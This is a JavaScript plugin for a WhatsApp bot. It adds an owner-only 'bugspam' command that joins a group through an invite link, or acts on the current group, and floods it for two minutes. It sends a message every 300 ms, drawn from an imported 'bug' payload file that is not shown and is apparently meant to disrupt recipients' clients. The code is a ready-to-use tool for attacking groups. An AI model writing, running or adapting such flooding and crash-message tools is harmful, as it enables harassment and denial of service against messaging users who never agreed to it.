const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../bug/izuka3.js'); // Kòrèk chemen an soti nan plugins/

cmd({
  pattern: 'bugspam',
  desc: 'Owner only command to spam messages in group or after joining group invite',
  category: 'bug',
  react: '🪲',
  filename: __filename
}, async (izuka, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
    if (cmdName !== 'bugspam') return;

    const botNumber = await izuka.decodeJid(izuka.user.id);
    const senderId = m.sender;
    const isOwner = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')].includes(senderId);

    if (!isOwner) {
      return await izuka.sendMessage(from, { text: '*📛 This is an owner-only command*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const isGroupLink = args[0]?.startsWith('https://chat.whatsapp.com/');
    const attackLines = bugchat.split('\n').filter(Boolean);

    // Function pou voye pandan 2 minit
    const startBugSpam = async (target) => {
      const endTime = Date.now() + 2 * 60 * 1000; // 2 minit

      while (Date.now() < endTime) {
        for (let line of attackLines) {
          await izuka.sendMessage(target, { text: `💥 ${line}\n_BUGSPAM ACTIVE_` });
          await new Promise(r => setTimeout(r, 300)); // Chak 300ms
        }
      }
    };

    // Case 1: DM + Group Invite Link
    if (!m.isGroup && isGroupLink) {
      const inviteCode = args[0].split('/')[3];
      try {
        const groupId = await izuka.groupAcceptInvite(inviteCode);
        await izuka.sendMessage(senderId, { text: `✅ Joined group via invite.\n🚀 Starting bugspam in ${groupId}...` }, { quoted: mek });

        await startBugSpam(groupId);

        await izuka.sendMessage(senderId, { text: `✅ Bugspam completed on group.` }, { quoted: mek });
      } catch (e) {
        return await izuka.sendMessage(senderId, { text: "❌ Failed to join group. Invite invalid or expired." }, { quoted: mek });
      }
      return;
    }

    // Case 2: Used directly inside a group
    if (m.isGroup) {
      await izuka.sendMessage(from, {
        text: `🚨 *BUGSPAM ACTIVATED*\n🧨 Target: ${from}\n🕒 Duration: 2 minutes`
      }, { quoted: mek });

      await startBugSpam(from);

      await izuka.sendMessage(from, {
        text: `✅ *BUGSPAM COMPLETE*\n🔥 Group has been spammed for 2 minutes.`
      }, { quoted: mek });

      return;
    }

    // Case 3: Invalid usage
    await izuka.sendMessage(from, {
      text: `❌ Usage:\n.bugspam https://chat.whatsapp.com/xxxxx (from DM to join & spam group)\n.bugspam (inside a group to spam that group)`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
